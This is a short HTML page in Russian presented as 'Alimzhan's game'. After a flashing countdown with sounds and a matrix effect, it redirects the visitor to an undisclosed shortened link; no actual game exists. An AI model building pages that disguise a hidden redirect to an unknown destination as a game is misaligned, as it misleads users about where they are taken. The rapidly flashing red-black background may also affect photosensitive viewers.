<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Игра Алимжана</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background: radial-gradient(circle, black, darkred, black);
      color: red;
      text-align: center;
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      animation: flickerBG 3s infinite, flash 10s infinite;
      overflow: hidden;
    }

    @keyframes flickerBG {
      0% { background: black; }
      50% { background: red; }
      100% { background: black; }
    }

    @keyframes flash {
      0% { background: black; }
      100% { background: darkred; }
    }

    h1 {
      font-size: 48px;
      text-transform: uppercase;
      margin-bottom: 20px;
      animation: neon 2s infinite alternate;
    }

    @keyframes neon {
      0% { text-shadow: 0 0 5px red; }
      100% { text-shadow: 0 0 20px crimson, 0 0 30px red; }
    }

    button {
      padding: 15px 30px;
      font-size: 24px;
      background-color: darkred;
      color: white;
      border: none;
      cursor: pointer;
      position: relative;
      overflow: hidden;
      transition: background-color 0.3s ease;
    }

    button:before {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      width: 400%;
      height: 400%;
      background: rgba(255, 255, 255, 0.5);
      transform: translate(-50%, -50%) rotate(45deg);
      transition: 0.5s all;
      border-radius: 50%;
    }

    button:hover:before {
      width: 0;
      height: 0;
      background: rgba(255, 255, 255, 0);
    }

    button:active {
      transform: scale(0.9);
    }

    .countdown {
      font-size: 48px;
      margin-top: 20px;
      display: none;
      color: lime;
      animation: pulse 0.5s infinite alternate;
    }

    @keyframes pulse {
      0% { transform: scale(1); }
      100% { transform: scale(1.2); }
    }

    .progress-bar {
      width: 80%;
      background-color: #333;
      height: 30px;
      border-radius: 15px;
      margin-top: 20px;
      overflow: hidden;
      display: none;
      box-shadow: 0 0 20px crimson;
      position: relative;
    }

    .progress {
      background-color: crimson;
      height: 100%;
      width: 0;
      transition: width 1s linear, background-color 1s linear;
      position: relative;
    }

    .progress:before {
      content: '';
      position: absolute;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.5);
      left: 0;
      top: 0;
      transform: scaleX(0);
      transform-origin: right;
      animation: spark 1s infinite;
    }

    @keyframes spark {
      0% { transform: scaleX(0); }
      50% { transform: scaleX(1); }
      100% { transform: scaleX(0); }
    }

    .matrix {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      overflow: hidden;
      display: none;
    }

    .matrix span {
      display: block;
      position: absolute;
      font-size: 16px;
      font-family: 'Courier New', monospace;
      color: lime;
      text-shadow: 0 0 5px lime;
      animation: fall 10s linear infinite;
    }

    @keyframes fall {
      0% { transform: translateY(-100%); opacity: 1; }
      100% { transform: translateY(100vh); opacity: 0; }
    }
  </style>
</head>
<body>

  <h1>Игра Алимжана</h1>
  <button id="start-btn">Начать игру</button>
  <div class="countdown" id="countdown">3</div>
  <div class="progress-bar" id="progress-bar">
    <div class="progress" id="progress"></div>
  </div>
  <div class="matrix" id="matrix"></div>

  <audio id="countdown-sound">
    <source src="https://www.soundjay.com/button/beep-07.wav" type="audio/wav">
  </audio>
  <audio id="final-sound">
    <source src="https://www.soundjay.com/explosion/explosion-01.mp3" type="audio/mp3">
  </audio>

  <script>
    document.getElementById('start-btn').addEventListener('click', function() {
      this.style.display = 'none';
      const countdown = document.getElementById('countdown');
      const countdownSound = document.getElementById('countdown-sound');
      const finalSound = document.getElementById('final-sound');
      const progressBar = document.getElementById('progress-bar');
      const progress = document.getElementById('progress');
      const matrix = document.getElementById('matrix');

      countdown.style.display = 'block';
      progressBar.style.display = 'block';
      matrix.style.display = 'block';
      createMatrixEffect();
      let count = 3;
      let width = 0;

      const interval = setInterval(() => {
        countdownSound.play();
        width += 33.33;
        progress.style.width = `${width}%`;

        if (count > 1) {
          countdown.textContent = count;
          count--;
        } else {
          clearInterval(interval);
          finalSound.play();
          setTimeout(() => {
            window.location.href = "https://lyl.su/APjf";
          }, 1000);
        }
      }, 1000);
    });

    function createMatrixEffect() {
      const matrix = document.getElementById('matrix');
      const symbols = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      for (let i = 0; i < 100; i++) {
        const span = document.createElement('span');
        span.textContent = symbols.charAt(Math.floor(Math.random() * symbols.length));
        span.style.left = Math.random() * 100 + 'vw';
        span.style.top = Math.random() * -100 + 'vh';
        span.style.animationDelay = Math.random() * 5 + 's';
        matrix.appendChild(span);
      }
    }
  </script>

</body>
</html>
